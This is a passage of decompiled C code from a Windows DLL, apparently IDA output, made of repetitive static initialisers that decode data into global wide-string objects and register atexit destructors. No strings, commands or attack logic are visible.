  wchar_t *v4; // eax
  wchar_t *v5; // eax
  wchar_t *v6; // eax
  wchar_t *v7; // eax
  wchar_t *v8; // eax
  wchar_t *v9; // eax
  wchar_t *v10; // eax
  wchar_t *v11; // eax
  wchar_t *v12; // eax
  wchar_t *v13; // eax
  wchar_t *v14; // eax
  wchar_t *v15; // eax
  wchar_t *v16; // eax
  wchar_t *v17; // eax
  wchar_t *v18; // eax
  wchar_t *v19; // eax
  wchar_t *v20; // eax
  wchar_t *v21; // eax
  wchar_t *v22; // eax
  wchar_t *v23; // eax
  wchar_t *v24; // eax
  wchar_t *v25; // eax
  wchar_t *v26; // eax
  wchar_t *v27; // eax
  wchar_t *v28; // eax
  wchar_t *v29; // eax
  wchar_t *v30; // eax
  wchar_t *v31; // eax
  wchar_t *v32; // eax
  wchar_t *v33; // eax
  wchar_t *v34; // eax
  wchar_t *v35; // eax
  wchar_t *v36; // eax
  wchar_t *v37; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B9B38);
  sub_1000CC20(dword_100BF080, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100B9AF8);
  sub_1000CC20(dword_100BF088, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100B9ABC);
  sub_1000CC20(dword_100BF090, v2);
  v3 = (wchar_t *)sub_1000E943((int)&unk_100B9A80);
  sub_1000CC20(dword_100BF098, v3);
  v4 = (wchar_t *)sub_1000E943((int)&unk_100B9A40);
  sub_1000CC20(dword_100BF0A0, v4);
  v5 = (wchar_t *)sub_1000E943((int)&unk_100B9A00);
  sub_1000CC20(dword_100BF0A8, v5);
  v6 = (wchar_t *)sub_1000E943((int)&unk_100B99C0);
  sub_1000CC20(dword_100BF0B0, v6);
  v7 = (wchar_t *)sub_1000E943((int)&unk_100B9980);
  sub_1000CC20(dword_100BF0B8, v7);
  v8 = (wchar_t *)sub_1000E943((int)&unk_100B9948);
  sub_1000CC20(dword_100BF0C0, v8);
  v9 = (wchar_t *)sub_1000E943((int)&unk_100B9910);
  sub_1000CC20(dword_100BF0C8, v9);
  v10 = (wchar_t *)sub_1000E943((int)&unk_100B98D4);
  sub_1000CC20(dword_100BF0D0, v10);
  v11 = (wchar_t *)sub_1000E943((int)&unk_100B9890);
  sub_1000CC20(dword_100BF0D8, v11);
  v12 = (wchar_t *)sub_1000E943((int)&unk_100B9850);
  sub_1000CC20(dword_100BF0E0, v12);
  v13 = (wchar_t *)sub_1000E943((int)&unk_100B9810);
  sub_1000CC20(dword_100BF0E8, v13);
  v14 = (wchar_t *)sub_1000E943((int)&unk_100B97D0);
  sub_1000CC20(dword_100BF0F0, v14);
  v15 = (wchar_t *)sub_1000E943((int)&unk_100B9788);
  sub_1000CC20(dword_100BF0F8, v15);
  v16 = (wchar_t *)sub_1000E943((int)&unk_100B9740);
  sub_1000CC20(dword_100BF100, v16);
  v17 = (wchar_t *)sub_1000E943((int)&unk_100B9708);
  sub_1000CC20(dword_100BF108, v17);
  v18 = (wchar_t *)sub_1000E943((int)&unk_100B96D0);
  sub_1000CC20(dword_100BF110, v18);
  v19 = (wchar_t *)sub_1000E943((int)&unk_100B9694);
  sub_1000CC20(dword_100BF118, v19);
  v20 = (wchar_t *)sub_1000E943((int)&unk_100B9658);
  sub_1000CC20(dword_100BF120, v20);
  v21 = (wchar_t *)sub_1000E943((int)&unk_100B961C);
  sub_1000CC20(dword_100BF128, v21);
  v22 = (wchar_t *)sub_1000E943((int)&unk_100B95E0);
  sub_1000CC20(dword_100BF130, v22);
  v23 = (wchar_t *)sub_1000E943((int)&unk_100B95A8);
  sub_1000CC20(dword_100BF138, v23);
  v24 = (wchar_t *)sub_1000E943((int)&unk_100B9568);
  sub_1000CC20(dword_100BF140, v24);
  v25 = (wchar_t *)sub_1000E943((int)&unk_100B9528);
  sub_1000CC20(dword_100BF148, v25);
  v26 = (wchar_t *)sub_1000E943((int)&unk_100B94E8);
  sub_1000CC20(dword_100BF150, v26);
  v27 = (wchar_t *)sub_1000E943((int)&unk_100B94A8);
  sub_1000CC20(dword_100BF158, v27);
  v28 = (wchar_t *)sub_1000E943((int)&unk_100B9468);
  sub_1000CC20(dword_100BF160, v28);
  v29 = (wchar_t *)sub_1000E943((int)&unk_100B9430);
  sub_1000CC20(dword_100BF168, v29);
  v30 = (wchar_t *)sub_1000E943((int)&unk_100B93F8);
  sub_1000CC20(dword_100BF170, v30);
  v31 = (wchar_t *)sub_1000E943((int)&unk_100B93B8);
  sub_1000CC20(dword_100BF178, v31);
  v32 = (wchar_t *)sub_1000E943((int)&unk_100B9378);
  sub_1000CC20(dword_100BF180, v32);
  v33 = (wchar_t *)sub_1000E943((int)&unk_100B9338);
  sub_1000CC20(dword_100BF188, v33);
  v34 = (wchar_t *)sub_1000E943((int)&unk_100B92FC);
  sub_1000CC20(dword_100BF190, v34);
  v35 = (wchar_t *)sub_1000E943((int)&unk_100B92B0);
  sub_1000CC20(dword_100BF198, v35);
  v36 = (wchar_t *)sub_1000E943((int)&unk_100B926C);
  sub_1000CC20(dword_100BF1A0, v36);
  v37 = (wchar_t *)sub_1000E943((int)&unk_100B9234);
  sub_1000CC20(dword_100BF1A8, v37);
  return atexit(sub_10089474);
}
// 100BF080: using guessed type _DWORD dword_100BF080[2];
// 100BF088: using guessed type _DWORD dword_100BF088[2];
// 100BF090: using guessed type _DWORD dword_100BF090[2];
// 100BF098: using guessed type _DWORD dword_100BF098[2];
// 100BF0A0: using guessed type _DWORD dword_100BF0A0[2];
// 100BF0A8: using guessed type _DWORD dword_100BF0A8[2];
// 100BF0B0: using guessed type _DWORD dword_100BF0B0[2];
// 100BF0B8: using guessed type _DWORD dword_100BF0B8[2];
// 100BF0C0: using guessed type _DWORD dword_100BF0C0[2];
// 100BF0C8: using guessed type _DWORD dword_100BF0C8[2];
// 100BF0D0: using guessed type _DWORD dword_100BF0D0[2];
// 100BF0D8: using guessed type _DWORD dword_100BF0D8[2];
// 100BF0E0: using guessed type _DWORD dword_100BF0E0[2];
// 100BF0E8: using guessed type _DWORD dword_100BF0E8[2];
// 100BF0F0: using guessed type _DWORD dword_100BF0F0[2];
// 100BF0F8: using guessed type _DWORD dword_100BF0F8[2];
// 100BF100: using guessed type _DWORD dword_100BF100[2];
// 100BF108: using guessed type _DWORD dword_100BF108[2];
// 100BF110: using guessed type _DWORD dword_100BF110[2];
// 100BF118: using guessed type _DWORD dword_100BF118[2];
// 100BF120: using guessed type _DWORD dword_100BF120[2];
// 100BF128: using guessed type _DWORD dword_100BF128[2];
// 100BF130: using guessed type _DWORD dword_100BF130[2];
// 100BF138: using guessed type _DWORD dword_100BF138[2];
// 100BF140: using guessed type _DWORD dword_100BF140[2];
// 100BF148: using guessed type _DWORD dword_100BF148[2];
// 100BF150: using guessed type _DWORD dword_100BF150[2];
// 100BF158: using guessed type _DWORD dword_100BF158[2];
// 100BF160: using guessed type _DWORD dword_100BF160[2];
// 100BF168: using guessed type _DWORD dword_100BF168[2];
// 100BF170: using guessed type _DWORD dword_100BF170[2];
// 100BF178: using guessed type _DWORD dword_100BF178[2];
// 100BF180: using guessed type _DWORD dword_100BF180[2];
// 100BF188: using guessed type _DWORD dword_100BF188[2];
// 100BF190: using guessed type _DWORD dword_100BF190[2];
// 100BF198: using guessed type _DWORD dword_100BF198[2];
// 100BF1A0: using guessed type _DWORD dword_100BF1A0[2];
// 100BF1A8: using guessed type _DWORD dword_100BF1A8[2];

//----- (10087611) --------------------------------------------------------
int sub_10087611()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B9B80);
  sub_1000CC20(dword_100BF578, v0);
  return atexit(sub_10089488);
}
// 100BF578: using guessed type _DWORD dword_100BF578[2];

//----- (10087633) --------------------------------------------------------
int sub_10087633()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B9BE0);
  sub_1000CC20(dword_100BF074, v0);
  return atexit(sub_10089492);
}
// 100BF074: using guessed type int dword_100BF074[3];

//----- (10087655) --------------------------------------------------------
int sub_10087655()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax
  wchar_t *v3; // eax
  wchar_t *v4; // eax
  wchar_t *v5; // eax
  wchar_t *v6; // eax
  wchar_t *v7; // eax
  wchar_t *v8; // eax
  wchar_t *v9; // eax
  wchar_t *v10; // eax
  wchar_t *v11; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B9F08);
  sub_1000CC20(dword_100BF1B0, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100B9EC0);
  sub_1000CC20(dword_100BF1B8, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100B9E78);
  sub_1000CC20(dword_100BF1C0, v2);
  v3 = (wchar_t *)sub_1000E943((int)&unk_100B9E30);
  sub_1000CC20(dword_100BF1C8, v3);
  v4 = (wchar_t *)sub_1000E943((int)&unk_100B9DF4);
  sub_1000CC20(dword_100BF1D0, v4);
  v5 = (wchar_t *)sub_1000E943((int)&unk_100B9DB4);
  sub_1000CC20(dword_100BF1D8, v5);
  v6 = (wchar_t *)sub_1000E943((int)&unk_100B9D7C);
  sub_1000CC20(dword_100BF1E0, v6);
  v7 = (wchar_t *)sub_1000E943((int)&unk_100B9D40);
  sub_1000CC20(dword_100BF1E8, v7);
  v8 = (wchar_t *)sub_1000E943((int)&unk_100B9D00);
  sub_1000CC20(dword_100BF1F0, v8);
  v9 = (wchar_t *)sub_1000E943((int)&unk_100B9CC8);
  sub_1000CC20(dword_100BF1F8, v9);
  v10 = (wchar_t *)sub_1000E943((int)&unk_100B9C8C);
  sub_1000CC20(dword_100BF200, v10);
  v11 = (wchar_t *)sub_1000E943((int)&unk_100B9C40);
  sub_1000CC20(dword_100BF208, v11);
  return atexit(sub_1008949C);
}
// 100BF1B0: using guessed type _DWORD dword_100BF1B0[2];
// 100BF1B8: using guessed type _DWORD dword_100BF1B8[2];
// 100BF1C0: using guessed type _DWORD dword_100BF1C0[2];
// 100BF1C8: using guessed type _DWORD dword_100BF1C8[2];
// 100BF1D0: using guessed type _DWORD dword_100BF1D0[2];
// 100BF1D8: using guessed type _DWORD dword_100BF1D8[2];
// 100BF1E0: using guessed type _DWORD dword_100BF1E0[2];
// 100BF1E8: using guessed type _DWORD dword_100BF1E8[2];
// 100BF1F0: using guessed type _DWORD dword_100BF1F0[2];
// 100BF1F8: using guessed type _DWORD dword_100BF1F8[2];
// 100BF200: using guessed type _DWORD dword_100BF200[2];
// 100BF208: using guessed type _DWORD dword_100BF208[2];

//----- (100877AE) --------------------------------------------------------
int sub_100877AE()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B9F50);
  sub_1000CC20(dword_100BF064, v0);
  return atexit(sub_100894B0);
}
// 100BF064: using guessed type _DWORD dword_100BF064[2];

//----- (100877D0) --------------------------------------------------------
int sub_100877D0()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax
  wchar_t *v3; // eax
  wchar_t *v4; // eax
  wchar_t *v5; // eax
  wchar_t *v6; // eax
  wchar_t *v7; // eax
  wchar_t *v8; // eax
  wchar_t *v9; // eax
  wchar_t *v10; // eax
  wchar_t *v11; // eax
  wchar_t *v12; // eax
  wchar_t *v13; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100BA320);
  sub_1000CC20(dword_100BF210, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100BA2D8);
  sub_1000CC20(dword_100BF218, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100BA2A0);
  sub_1000CC20(dword_100BF220, v2);
  v3 = (wchar_t *)sub_1000E943((int)&unk_100BA26C);
  sub_1000CC20(dword_100BF228, v3);
  v4 = (wchar_t *)sub_1000E943((int)&unk_100BA234);
  sub_1000CC20(dword_100BF230, v4);
  v5 = (wchar_t *)sub_1000E943((int)&unk_100BA1F8);
  sub_1000CC20(dword_100BF238, v5);
  v6 = (wchar_t *)sub_1000E943((int)&unk_100BA1B8);
  sub_1000CC20(dword_100BF240, v6);
  v7 = (wchar_t *)sub_1000E943((int)&unk_100BA17C);
  sub_1000CC20(dword_100BF248, v7);
  v8 = (wchar_t *)sub_1000E943((int)&unk_100BA140);
  sub_1000CC20(dword_100BF250, v8);
  v9 = (wchar_t *)sub_1000E943((int)&unk_100BA100);
  sub_1000CC20(dword_100BF258, v9);
  v10 = (wchar_t *)sub_1000E943((int)&unk_100BA0A8);
  sub_1000CC20(dword_100BF260, v10);
  v11 = (wchar_t *)sub_1000E943((int)&unk_100BA048);
  sub_1000CC20(dword_100BF268, v11);
  v12 = (wchar_t *)sub_1000E943((int)&unk_100BA000);
  sub_1000CC20(dword_100BF270, v12);
  v13 = (wchar_t *)sub_1000E943((int)&unk_100B9FB0);
  sub_1000CC20(dword_100BF278, v13);
  return atexit(sub_100894BA);
}
// 100BF210: using guessed type _DWORD dword_100BF210[2];
// 100BF218: using guessed type _DWORD dword_100BF218[2];
// 100BF220: using guessed type _DWORD dword_100BF220[2];
// 100BF228: using guessed type _DWORD dword_100BF228[2];
// 100BF230: using guessed type _DWORD dword_100BF230[2];
// 100BF238: using guessed type _DWORD dword_100BF238[2];
// 100BF240: using guessed type _DWORD dword_100BF240[2];
// 100BF248: using guessed type _DWORD dword_100BF248[2];
// 100BF250: using guessed type _DWORD dword_100BF250[2];
// 100BF258: using guessed type _DWORD dword_100BF258[2];
// 100BF260: using guessed type _DWORD dword_100BF260[2];
// 100BF268: using guessed type _DWORD dword_100BF268[2];
// 100BF270: using guessed type _DWORD dword_100BF270[2];
// 100BF278: using guessed type _DWORD dword_100BF278[2];

//----- (1008795D) --------------------------------------------------------
int sub_1008795D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100BA368);
  sub_1000CC20(dword_100BF588, v0);
  return atexit(sub_100894CE);
}
// 100BF588: using guessed type _DWORD dword_100BF588[2];

//----- (1008797F) --------------------------------------------------------
int sub_1008797F()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax
  wchar_t *v3; // eax
  wchar_t *v4; // eax
  wchar_t *v5; // eax
  wchar_t *v6; // eax
  wchar_t *v7; // eax
  wchar_t *v8; // eax
  wchar_t *v9; // eax
  wchar_t *v10; // eax
  wchar_t *v11; // eax
  wchar_t *v12; // eax
  wchar_t *v13; // eax
  wchar_t *v14; // eax
  wchar_t *v15; // eax
  wchar_t *v16; // eax
  wchar_t *v17; // eax
  wchar_t *v18; // eax
  wchar_t *v19; // eax
  wchar_t *v20; // eax
  wchar_t *v21; // eax
  wchar_t *v22; // eax
  wchar_t *v23; // eax
  wchar_t *v24; // eax
  wchar_t *v25; // eax
  wchar_t *v26; // eax
  wchar_t *v27; // eax
  wchar_t *v28; // eax
  wchar_t *v29; // eax
  wchar_t *v30; // eax
  wchar_t *v31; // eax
  wchar_t *v32; // eax
  wchar_t *v33; // eax
  wchar_t *v34; // eax
  wchar_t *v35; // eax
  wchar_t *v36; // eax
  wchar_t *v37; // eax
  wchar_t *v38; // eax
  wchar_t *v39; // eax
  wchar_t *v40; // eax
  wchar_t *v41; // eax
  wchar_t *v42; // eax
  wchar_t *v43; // eax
  wchar_t *v44; // eax
  wchar_t *v45; // eax
  wchar_t *v46; // eax
  wchar_t *v47; // eax
  wchar_t *v48; // eax
  wchar_t *v49; // eax
  wchar_t *v50; // eax
  wchar_t *v51; // eax
  wchar_t *v52; // eax
  wchar_t *v53; // eax
  wchar_t *v54; // eax
  wchar_t *v55; // eax
  wchar_t *v56; // eax
  wchar_t *v57; // eax
  wchar_t *v58; // eax
  wchar_t *v59; // eax
  wchar_t *v60; // eax
  wchar_t *v61; // eax
  wchar_t *v62; // eax
  wchar_t *v63; // eax
  wchar_t *v64; // eax
  wchar_t *v65; // eax
  wchar_t *v66; // eax
  wchar_t *v67; // eax
  wchar_t *v68; // eax
  wchar_t *v69; // eax
  wchar_t *v70; // eax
  wchar_t *v71; // eax
  wchar_t *v72; // eax
  wchar_t *v73; // eax
  wchar_t *v74; // eax
  wchar_t *v75; // eax
  wchar_t *v76; // eax
  wchar_t *v77; // eax
  wchar_t *v78; // eax
  wchar_t *v79; // eax
  wchar_t *v80; // eax
  wchar_t *v81; // eax
  wchar_t *v82; // eax
  wchar_t *v83; // eax
  wchar_t *v84; // eax
  wchar_t *v85; // eax
  wchar_t *v86; // eax
  wchar_t *v87; // eax
  wchar_t *v88; // eax
  wchar_t *v89; // eax
  wchar_t *v90; // eax
  wchar_t *v91; // eax
  wchar_t *v92; // eax
  wchar_t *v93; // eax
  wchar_t *v94; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100BBBA0);
  sub_1000CC20(dword_100BF280, v0);
  v1 = (wchar_t *)sub_1000E943((int)&unk_100BBB68);
  sub_1000CC20(dword_100BF288, v1);
  v2 = (wchar_t *)sub_1000E943((int)&unk_100BBB2C);
  sub_1000CC20(dword_100BF290, v2);
  v3 = (wchar_t *)sub_1000E943((int)&unk_100BBAF0);
  sub_1000CC20(dword_100BF298, v3);
  v4 = (wchar_t *)sub_1000E943((int)&unk_100BBAB0);
  sub_1000CC20(dword_100BF2A0, v4);
  v5 = (wchar_t *)sub_1000E943((int)&unk_100BBA70);
  sub_1000CC20(dword_100BF2A8, v5);
  v6 = (wchar_t *)sub_1000E943((int)&unk_100BBA30);
  sub_1000CC20(dword_100BF2B0, v6);
  v7 = (wchar_t *)sub_1000E943((int)&unk_100BB9F4);
  sub_1000CC20(dword_100BF2B8, v7);
  v8 = (wchar_t *)sub_1000E943((int)&unk_100BB9B4);
  sub_1000CC20(dword_100BF2C0, v8);
  v9 = (wchar_t *)sub_1000E943((int)&unk_100BB978);
  sub_1000CC20(dword_100BF2C8, v9);
  v10 = (wchar_t *)sub_1000E943((int)&unk_100BB938);
  sub_1000CC20(dword_100BF2D0, v10);
  v11 = (wchar_t *)sub_1000E943((int)&unk_100BB900);
  sub_1000CC20(dword_100BF2D8, v11);
  v12 = (wchar_t *)sub_1000E943((int)&unk_100BB8B8);
  sub_1000CC20(dword_100BF2E0, v12);
  v13 = (wchar_t *)sub_1000E943((int)&unk_100BB87C);
  sub_1000CC20(dword_100BF2E8, v13);
  v14 = (wchar_t *)sub_1000E943((int)&unk_100BB840);
  sub_1000CC20(dword_100BF2F0, v14);
  v15 = (wchar_t *)sub_1000E943((int)&unk_100BB800);
  sub_1000CC20(dword_100BF2F8, v15);
  v16 = (wchar_t *)sub_1000E943((int)&unk_100BB7C0);
  sub_1000CC20(dword_100BF300, v16);
  v17 = (wchar_t *)sub_1000E943((int)&unk_100BB784);
  sub_1000CC20(dword_100BF308, v17);
  v18 = (wchar_t *)sub_1000E943((int)&unk_100BB738);
  sub_1000CC20(dword_100BF310, v18);
  v19 = (wchar_t *)sub_1000E943((int)&unk_100BB6FC);
  sub_1000CC20(dword_100BF318, v19);
  v20 = (wchar_t *)sub_1000E943((int)&unk_100BB6C0);
  sub_1000CC20(dword_100BF320, v20);
  v21 = (wchar_t *)sub_1000E943((int)&unk_100BB680);
  sub_1000CC20(dword_100BF328, v21);
  v22 = (wchar_t *)sub_1000E943((int)&unk_100BB644);
  sub_1000CC20(dword_100BF330, v22);
  v23 = (wchar_t *)sub_1000E943((int)&unk_100BB608);
  sub_1000CC20(dword_100BF338, v23);
  v24 = (wchar_t *)sub_1000E943((int)&unk_100BB5C8);
  sub_1000CC20(dword_100BF340, v24);
  v25 = (wchar_t *)sub_1000E943((int)&unk_100BB588);
  sub_1000CC20(dword_100BF348, v25);
  v26 = (wchar_t *)sub_1000E943((int)&unk_100BB548);
  sub_1000CC20(dword_100BF350, v26);
  v27 = (wchar_t *)sub_1000E943((int)&unk_100BB508);
  sub_1000CC20(dword_100BF358, v27);
  v28 = (wchar_t *)sub_1000E943((int)&unk_100BB4CC);
  sub_1000CC20(dword_100BF360, v28);
  v29 = (wchar_t *)sub_1000E943((int)&unk_100BB490);
  sub_1000CC20(dword_100BF368, v29);
  v30 = (wchar_t *)sub_1000E943((int)&unk_100BB458);
  sub_1000CC20(dword_100BF370, v30);
  v31 = (wchar_t *)sub_1000E943((int)&unk_100BB41C);
  sub_1000CC20(dword_100BF378, v31);
  v32 = (wchar_t *)sub_1000E943((int)&unk_100BB3E4);
  sub_1000CC20(dword_100BF380, v32);
  v33 = (wchar_t *)sub_1000E943((int)&unk_100BB3A8);
  sub_1000CC20(dword_100BF388, v33);
  v34 = (wchar_t *)sub_1000E943((int)&unk_100BB36C);
  sub_1000CC20(dword_100BF390, v34);
  v35 = (wchar_t *)sub_1000E943((int)&unk_100BB330);
  sub_1000CC20(dword_100BF398, v35);
  v36 = (wchar_t *)sub_1000E943((int)&unk_100BB2F0);
  sub_1000CC20(dword_100BF3A0, v36);
  v37 = (wchar_t *)sub_1000E943((int)&unk_100BB2B4);
  sub_1000CC20(dword_100BF3A8, v37);
  v38 = (wchar_t *)sub_1000E943((int)&unk_100BB274);
  sub_1000CC20(dword_100BF3B0, v38);
  v39 = (wchar_t *)sub_1000E943((int)&unk_100BB23C);
  sub_1000CC20(dword_100BF3B8, v39);
  v40 = (wchar_t *)sub_1000E943((int)&unk_100BB200);
  sub_1000CC20(dword_100BF3C0, v40);
  v41 = (wchar_t *)sub_1000E943((int)&unk_100BB1C0);
  sub_1000CC20(dword_100BF3C8, v41);
  v42 = (wchar_t *)sub_1000E943((int)&unk_100BB184);
  sub_1000CC20(dword_100BF3D0, v42);
  v43 = (wchar_t *)sub_1000E943((int)&unk_100BB140);
  sub_1000CC20(dword_100BF3D8, v43);
  v44 = (wchar_t *)sub_1000E943((int)&unk_100BB104);
  sub_1000CC20(dword_100BF3E0, v44);
  v45 = (wchar_t *)sub_1000E943((int)&unk_100BB0B8);
  sub_1000CC20(dword_100BF3E8, v45);
  v46 = (wchar_t *)sub_1000E943((int)&unk_100BB074);
  sub_1000CC20(dword_100BF3F0, v46);
  v47 = (wchar_t *)sub_1000E943((int)&unk_100BB020);
  sub_1000CC20(dword_100BF3F8, v47);
  v48 = (wchar_t *)sub_1000E943((int)&unk_100BAFE0);
  sub_1000CC20(dword_100BF400, v48);
  v49 = (wchar_t *)sub_1000E943((int)&unk_100BAFA0);
  sub_1000CC20(dword_100BF408, v49);
  v50 = (wchar_t *)sub_1000E943((int)&unk_100BAF64);
  sub_1000CC20(dword_100BF410, v50);
  v51 = (wchar_t *)sub_1000E943((int)&unk_100BAF28);
  sub_1000CC20(dword_100BF418, v51);
  v52 = (wchar_t *)sub_1000E943((int)&unk_100BAEE8);
  sub_1000CC20(dword_100BF420, v52);
  v53 = (wchar_t *)sub_1000E943((int)&unk_100BAEA0);
  sub_1000CC20(dword_100BF428, v53);
  v54 = (wchar_t *)sub_1000E943((int)&unk_100BAE58);
  sub_1000CC20(dword_100BF430, v54);
  v55 = (wchar_t *)sub_1000E943((int)&unk_100BAE14);
  sub_1000CC20(dword_100BF438, v55);
  v56 = (wchar_t *)sub_1000E943((int)&unk_100BADD0);
  sub_1000CC20(dword_100BF440, v56);
  v57 = (wchar_t *)sub_1000E943((int)&unk_100BAD88);
  sub_1000CC20(dword_100BF448, v57);
  v58 = (wchar_t *)sub_1000E943((int)&unk_100BAD4C);
  sub_1000CC20(dword_100BF450, v58);
  v59 = (wchar_t *)sub_1000E943((int)&unk_100BAD0C);
  sub_1000CC20(dword_100BF458, v59);
  v60 = (wchar_t *)sub_1000E943((int)&unk_100BACC0);
  sub_1000CC20(dword_100BF460, v60);
  v61 = (wchar_t *)sub_1000E943((int)&unk_100BAC84);
  sub_1000CC20(dword_100BF468, v61);
  v62 = (wchar_t *)sub_1000E943((int)&unk_100BAC40);
  sub_1000CC20(dword_100BF470, v62);
  v63 = (wchar_t *)sub_1000E943((int)&unk_100BAC00);
  sub_1000CC20(dword_100BF478, v63);
  v64 = (wchar_t *)sub_1000E943((int)&unk_100BABB0);
  sub_1000CC20(dword_100BF480, v64);
  v65 = (wchar_t *)sub_1000E943((int)&unk_100BAB70);
  sub_1000CC20(dword_100BF488, v65);
  v66 = (wchar_t *)sub_1000E943((int)&unk_100BAB30);
  sub_1000CC20(dword_100BF490, v66);
  v67 = (wchar_t *)sub_1000E943((int)&unk_100BAAF4);
  sub_1000CC20(dword_100BF498, v67);
  v68 = (wchar_t *)sub_1000E943((int)&unk_100BAAB8);
  sub_1000CC20(dword_100BF4A0, v68);
  v69 = (wchar_t *)sub_1000E943((int)&unk_100BAA78);
  sub_1000CC20(dword_100BF4A8, v69);
  v70 = (wchar_t *)sub_1000E943((int)&unk_100BAA38);
  sub_1000CC20(dword_100BF4B0, v70);
  v71 = (wchar_t *)sub_1000E943((int)&unk_100BA9F8);
  sub_1000CC20(dword_100BF4B8, v71);
  v72 = (wchar_t *)sub_1000E943((int)&unk_100BA9B8);
  sub_1000CC20(dword_100BF4C0, v72);
  v73 = (wchar_t *)sub_1000E943((int)&unk_100BA97C);
  sub_1000CC20(dword_100BF4C8, v73);
  v74 = (wchar_t *)sub_1000E943((int)&unk_100BA93C);
  sub_1000CC20(dword_100BF4D0, v74);
  v75 = (wchar_t *)sub_1000E943((int)&unk_100BA8F8);
  sub_1000CC20(dword_100BF4D8, v75);
  v76 = (wchar_t *)sub_1000E943((int)&unk_100BA8B8);
  sub_1000CC20(dword_100BF4E0, v76);
  v77 = (wchar_t *)sub_1000E943((int)&unk_100BA87C);
  sub_1000CC20(dword_100BF4E8, v77);
  v78 = (wchar_t *)sub_1000E943((int)&unk_100BA840);
  sub_1000CC20(dword_100BF4F0, v78);
  v79 = (wchar_t *)sub_1000E943((int)&unk_100BA800);
  sub_1000CC20(dword_100BF4F8, v79);
  v80 = (wchar_t *)sub_1000E943((int)&unk_100BA7C0);
  sub_1000CC20(dword_100BF500, v80);
  v81 = (wchar_t *)sub_1000E943((int)&unk_100BA784);
  sub_1000CC20(dword_100BF508, v81);
  v82 = (wchar_t *)sub_1000E943((int)&unk_100BA738);
  sub_1000CC20(dword_100BF510, v82);
  v83 = (wchar_t *)sub_1000E943((int)&unk_100BA6E8);
  sub_1000CC20(dword_100BF518, v83);
  v84 = (wchar_t *)sub_1000E943((int)&unk_100BA680);
  sub_1000CC20(dword_100BF520, v84);
  v85 = (wchar_t *)sub_1000E943((int)&unk_100BA640);
  sub_1000CC20(dword_100BF528, v85);
  v86 = (wchar_t *)sub_1000E943((int)&unk_100BA604);
  sub_1000CC20(dword_100BF530, v86);
  v87 = (wchar_t *)sub_1000E943((int)&unk_100BA5C4);
  sub_1000CC20(dword_100BF538, v87);
  v88 = (wchar_t *)sub_1000E943((int)&unk_100BA588);
  sub_1000CC20(dword_100BF540, v88);
  v89 = (wchar_t *)sub_1000E943((int)&unk_100BA550);
  sub_1000CC20(dword_100BF548, v89);
  v90 = (wchar_t *)sub_1000E943((int)&unk_100BA500);
  sub_1000CC20(dword_100BF550, v90);
  v91 = (wchar_t *)sub_1000E943((int)&unk_100BA4C0);
  sub_1000CC20(dword_100BF558, v91);
  v92 = (wchar_t *)sub_1000E943((int)&unk_100BA468);
  sub_1000CC20(dword_100BF560, v92);
  v93 = (wchar_t *)sub_1000E943((int)&unk_100BA408);
  sub_1000CC20(dword_100BF568, v93);
  v94 = (wchar_t *)sub_1000E943((int)&unk_100BA3CC);
  sub_1000CC20(dword_100BF570, v94);
  return atexit(sub_100894D8);
}
// 100BF280: using guessed type _DWORD dword_100BF280[2];
// 100BF288: using guessed type _DWORD dword_100BF288[2];
// 100BF290: using guessed type _DWORD dword_100BF290[2];
// 100BF298: using guessed type _DWORD dword_100BF298[2];
// 100BF2A0: using guessed type _DWORD dword_100BF2A0[2];
// 100BF2A8: using guessed type _DWORD dword_100BF2A8[2];
// 100BF2B0: using guessed type _DWORD dword_100BF2B0[2];
// 100BF2B8: using guessed type _DWORD dword_100BF2B8[2];
// 100BF2C0: using guessed type _DWORD dword_100BF2C0[2];
// 100BF2C8: using guessed type _DWORD dword_100BF2C8[2];
// 100BF2D0: using guessed type _DWORD dword_100BF2D0[2];
// 100BF2D8: using guessed type _DWORD dword_100BF2D8[2];
// 100BF2E0: using guessed type _DWORD dword_100BF2E0[2];
// 100BF2E8: using guessed type _DWORD dword_100BF2E8[2];
// 100BF2F0: using guessed type _DWORD dword_100BF2F0[2];
// 100BF2F8: using guessed type _DWORD dword_100BF2F8[2];
// 100BF300: using guessed type _DWORD dword_100BF300[2];
// 100BF308: using guessed type _DWORD dword_100BF308[2];
// 100BF310: using guessed type _DWORD dword_100BF310[2];
// 100BF318: using guessed type _DWORD dword_100BF318[2];
// 100BF320: using guessed type _DWORD dword_100BF320[2];
// 100BF328: using guessed type _DWORD dword_100BF328[2];
// 100BF330: using guessed type _DWORD dword_100BF330[2];
// 100BF338: using guessed type _DWORD dword_100BF338[2];
// 100BF340: using guessed type _DWORD dword_100BF340[2];
// 100BF348: using guessed type _DWORD dword_100BF348[2];
// 100BF350: using guessed type _DWORD dword_100BF350[2];
// 100BF358: using guessed type _DWORD dword_100BF358[2];
// 100BF360: using guessed type _DWORD dword_100BF360[2];
// 100BF368: using guessed type _DWORD dword_100BF368[2];
// 100BF370: using guessed type _DWORD dword_100BF370[2];
// 100BF378: using guessed type _DWORD dword_100BF378[2];
// 100BF380: using guessed type _DWORD dword_100BF380[2];
// 100BF388: using guessed type _DWORD dword_100BF388[2];
// 100BF390: using guessed type _DWORD dword_100BF390[2];
// 100BF398: using guessed type _DWORD dword_100BF398[2];
// 100BF3A0: using guessed type _DWORD dword_100BF3A0[2];
// 100BF3A8: using guessed type _DWORD dword_100BF3A8[2];
// 100BF3B0: using guessed type _DWORD dword_100BF3B0[2];
// 100BF3B8: using guessed type _DWORD dword_100BF3B8[2];
